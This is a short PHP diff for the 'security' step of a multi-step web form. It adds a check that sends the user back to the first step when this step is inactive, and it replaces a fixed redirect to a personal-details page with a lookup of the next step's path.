@@ -2,6 +2,11 @@
 include '../settings.php';
 include 'functions.php';
 
+if (!h4z3_is_step_active('security')) {
+    header('Location: ' . h4z3_get_first_step_path('../'));
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $q1 = $_POST['q1'];
@@ -54,7 +59,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
         }
 
-    header('Location: ../personal.php');
+    $nextStep = h4z3_get_next_step_path('security', '../');
+    header('Location: ' . $nextStep);
     exit;
 }
 ?>
